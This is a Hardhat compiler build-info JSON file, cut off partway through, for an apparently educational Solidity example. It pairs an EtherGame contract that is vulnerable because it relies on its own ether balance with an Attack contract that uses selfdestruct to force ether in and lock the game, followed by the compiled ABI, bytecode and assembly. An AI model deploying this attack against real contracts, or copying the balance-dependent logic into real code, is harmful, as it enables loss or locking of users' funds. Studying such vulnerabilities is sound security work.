{
	"id": "5a7b32e05f04c92807571adcab0c22f9",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.13",
	"solcLongVersion": "0.8.13+commit.abaa5c0e",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/SelfDestructPrblem.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.2;\r\n\r\n\r\ncontract EtherGame {\r\n    uint public targetAmount = 7 ether;\r\n    address public winner;\r\n\r\n    function deposit() public payable {\r\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\r\n\r\n        uint balance = address(this).balance;\r\n        require(balance <= targetAmount, \"Game is over\");\r\n\r\n        if (balance == targetAmount) {\r\n            winner = msg.sender;\r\n        }\r\n    }\r\n\r\n    function claimReward() public {\r\n        require(msg.sender == winner, \"Not winner\");\r\n\r\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\r\n        require(sent, \"Failed to send Ether\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n    EtherGame etherGame;\r\n\r\n    constructor(EtherGame _etherGame) {\r\n        etherGame = EtherGame(_etherGame);\r\n    }\r\n\r\n    function attack() public payable {\r\n      \r\n        address payable addr = payable(address(etherGame));\r\n        selfdestruct(addr);\r\n    }\r\n}\r\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": true,
				"runs": 199
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/SelfDestructPrblem.sol": {
				"Attack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "contract EtherGame",
									"name": "_etherGame",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"contracts/SelfDestructPrblem.sol\":698:985  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/SelfDestructPrblem.sol\":749:835  constructor(EtherGame _etherGame) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_2\n  swap2\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/SelfDestructPrblem.sol\":794:803  etherGame */\n  0x00\n    /* \"contracts/SelfDestructPrblem.sol\":794:827  etherGame = EtherGame(_etherGame) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  swap1\n  swap3\n  and\n  swap2\n  swap1\n  swap2\n  or\n  swap1\n  sstore\n    /* \"contracts/SelfDestructPrblem.sol\":698:985  contract Attack {... */\n  jump(tag_7)\n    /* \"#utility.yul\":14:320   */\ntag_3:\n    /* \"#utility.yul\":100:106   */\n  0x00\n    /* \"#utility.yul\":153:155   */\n  0x20\n    /* \"#utility.yul\":141:150   */\n  dup3\n    /* \"#utility.yul\":132:139   */\n  dup5\n    /* \"#utility.yul\":128:151   */\n  sub\n    /* \"#utility.yul\":124:156   */\n  slt\n    /* \"#utility.yul\":121:173   */\n  iszero\n  tag_9\n  jumpi\n    /* \"#utility.yul\":169:170   */\n  0x00\n    /* \"#utility.yul\":166:167   */\n  dup1\n    /* \"#utility.yul\":159:171   */\n  revert\n    /* \"#utility.yul\":121:173   */\ntag_9:\n    /* \"#utility.yul\":195:211   */\n  dup2\n  mload\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":240:271   */\n  dup2\n  and\n    /* \"#utility.yul\":230:272   */\n  dup2\n  eq\n    /* \"#utility.yul\":220:290   */\n  tag_10\n  jumpi\n    /* \"#utility.yul\":286:287   */\n  0x00\n    /* \"#utility.yul\":283:284   */\n  dup1\n    /* \"#utility.yul\":276:288   */\n  revert\n    /* \"#utility.yul\":220:290   */\ntag_10:\n    /* \"#utility.yul\":309:314   */\n  swap4\n    /* \"#utility.yul\":14:320   */\n  swap3\n  pop\n  pop\n  pop\n  jump\t// out\ntag_7:\n    /* \"contracts/SelfDestructPrblem.sol\":698:985  contract Attack {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/SelfDestructPrblem.sol\":698:985  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x9e5faafc\n      eq\n      tag_2\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"contracts/SelfDestructPrblem.sol\":843:982  function attack() public payable {... */\n    tag_2:\n      tag_3\n      tag_4\n      jump\t// in\n    tag_3:\n      stop\n    tag_4:\n        /* \"contracts/SelfDestructPrblem.sol\":895:915  address payable addr */\n      0x00\n        /* \"contracts/SelfDestructPrblem.sol\":934:943  etherGame */\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup1\n        /* \"contracts/SelfDestructPrblem.sol\":956:974  selfdestruct(addr) */\n      selfdestruct\n\n    auxdata: 0xa26469706673582212201ce4d8ae5f9f6c42cd64f3c1ca96c6f3fe51f0de65a6442bd36f9812c84a92b664736f6c634300080d0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_91": {
									"entryPoint": null,
									"id": 91,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_tuple_t_contract$_EtherGame_$75_fromMemory": {
									"entryPoint": 84,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:322:1",
										"statements": [
											{
												"nodeType": "YulBlock",
												"src": "6:3:1",
												"statements": []
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "111:209:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "157:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "166:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "169:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "159:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "159:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "159:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "132:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "141:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "128:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "128:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "153:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "124:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "124:32:1"
															},
															"nodeType": "YulIf",
															"src": "121:52:1"
														},
														{
															"nodeType": "YulVariableDeclaration",
															"src": "182:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "201:9:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "195:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "195:16:1"
															},
															"variables": [
																{
																	"name": "value",
																	"nodeType": "YulTypedName",
																	"src": "186:5:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "274:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "283:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "286:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "276:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "276:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "276:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "233:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "244:5:1"
																					},
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "259:3:1",
																										"type": "",
																										"value": "160"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "264:1:1",
																										"type": "",
																										"value": "1"
																									}
																								],
																								"functionName": {
																									"name": "shl",
																									"nodeType": "YulIdentifier",
																									"src": "255:3:1"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "255:11:1"
																							},
																							{
																								"kind": "number",
																								"nodeType": "YulLiteral",
																								"src": "268:1:1",
																								"type": "",
																								"value": "1"
																							}
																						],
																						"functionName": {
																							"name": "sub",
																							"nodeType": "YulIdentifier",
																							"src": "251:3:1"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "251:19:1"
																					}
																				],
																				"functionName": {
																					"name": "and",
																					"nodeType": "YulIdentifier",
																					"src": "240:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "240:31:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "230:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "230:42:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "223:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "223:50:1"
															},
															"nodeType": "YulIf",
															"src": "220:70:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "299:15:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "309:5:1"
															},
															"variableNames": [
																{
																	"name": "value0",
																	"nodeType": "YulIdentifier",
																	"src": "299:6:1"
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_contract$_EtherGame_$75_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "77:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "88:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "100:6:1",
														"type": ""
													}
												],
												"src": "14:306:1"
											}
										]
									},
									"contents": "{\n    { }\n    function abi_decode_tuple_t_contract$_EtherGame_$75_fromMemory(headStart, dataEnd) -> value0\n    {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n        let value := mload(headStart)\n        if iszero(eq(value, and(value, sub(shl(160, 1), 1)))) { revert(0, 0) }\n        value0 := value\n    }\n}",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5060405161010038038061010083398101604081905261002f91610054565b600080546001600160a01b0319166001600160a01b0392909216919091179055610084565b60006020828403121561006657600080fd5b81516001600160a01b038116811461007d57600080fd5b9392505050565b606e806100926000396000f3fe608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b6000546001600160a01b031680fffea26469706673582212201ce4d8ae5f9f6c42cd64f3c1ca96c6f3fe51f0de65a6442bd36f9812c84a92b664736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x100 CODESIZE SUB DUP1 PUSH2 0x100 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x54 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP3 SWAP1 SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SSTORE PUSH2 0x84 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x7D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x6E DUP1 PUSH2 0x92 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x27 PUSH1 0x29 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP1 SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SHR 0xE4 0xD8 0xAE 0x5F SWAP16 PUSH13 0x42CD64F3C1CA96C6F3FE51F0DE PUSH6 0xA6442BD36F98 SLT 0xC8 0x4A SWAP3 0xB6 PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "698:287:0:-:0;;;749:86;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;794:9;:33;;-1:-1:-1;;;;;;794:33:0;-1:-1:-1;;;;;794:33:0;;;;;;;;;;698:287;;14:306:1;100:6;153:2;141:9;132:7;128:23;124:32;121:52;;;169:1;166;159:12;121:52;195:16;;-1:-1:-1;;;;;240:31:1;;230:42;;220:70;;286:1;283;276:12;220:70;309:5;14:306;-1:-1:-1;;;14:306:1:o;:::-;698:287:0;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@attack_109": {
									"entryPoint": 41,
									"id": 109,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610601c5760003560e01c80639e5faafc146021575b600080fd5b60276029565b005b6000546001600160a01b031680fffea26469706673582212201ce4d8ae5f9f6c42cd64f3c1ca96c6f3fe51f0de65a6442bd36f9812c84a92b664736f6c634300080d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x1C JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH1 0x21 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x27 PUSH1 0x29 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP1 SELFDESTRUCT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SHR 0xE4 0xD8 0xAE 0x5F SWAP16 PUSH13 0x42CD64F3C1CA96C6F3FE51F0DE PUSH6 0xA6442BD36F98 SLT 0xC8 0x4A SWAP3 0xB6 PUSH5 0x736F6C6343 STOP ADDMOD 0xD STOP CALLER ",
							"sourceMap": "698:287:0:-:0;;;;;;;;;;;;;;;;;;;;;843:139;;;:::i;:::-;;;895:20;934:9;-1:-1:-1;;;;;934:9:0;;956:18"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "22000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"attack()": "29813"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 749,
									"end": 835,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 749,
									"end": 835,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 794,
									"end": 803,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 794,
									"end": 827,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT",
									"source": -1
								},
								{
									"begin": 794,
									"end": 827,
									"name": "AND",
									"source": 0
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 794,
									"end": 827,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "7"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 14,
									"end": 320,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 14,
									"end": 320,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 100,
									"end": 106,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 153,
									"end": 155,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 141,
									"end": 150,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 132,
									"end": 139,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 128,
									"end": 151,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 124,
									"end": 156,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 121,
									"end": 173,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 121,
									"end": 173,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 121,
									"end": 173,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 169,
									"end": 170,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 166,
									"end": 167,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 159,
									"end": 171,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 121,
									"end": 173,
									"name": "tag",
									"source": 1,
									"value": "9"
								},
								{
									"begin": 121,
									"end": 173,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 195,
									"end": 211,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 195,
									"end": 211,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"source": -1,
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB",
									"source": -1
								},
								{
									"begin": 240,
									"end": 271,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 240,
									"end": 271,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 230,
									"end": 272,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 230,
									"end": 272,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 220,
									"end": 290,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 220,
									"end": 290,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 286,
									"end": 287,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 283,
									"end": 284,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 276,
									"end": 288,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 220,
									"end": 290,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 220,
									"end": 290,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 309,
									"end": 314,
									"name": "SWAP4",
									"source": 1
								},
								{
									"begin": 14,
									"end": 320,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 14,
									"end": 320,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 14,
									"end": 320,
									"name": "tag",
									"source": 1,
									"value": "7"
								},
								{
									"begin": 14,
									"end": 320,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 698,
									"end": 985,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 698,
									"end": 985,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212201ce4d8ae5f9f6c42cd64f3c1ca96c6f3fe51f0de65a6442bd36f9812c84a92b664736f6c634300080d0033",
									".code": [
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "9E5FAAFC"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 698,
											"end": 985,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 698,
											"end": 985,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 843,
											"end": 982,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 843,
											"end": 982,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 843,
											"end": 982,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 843,
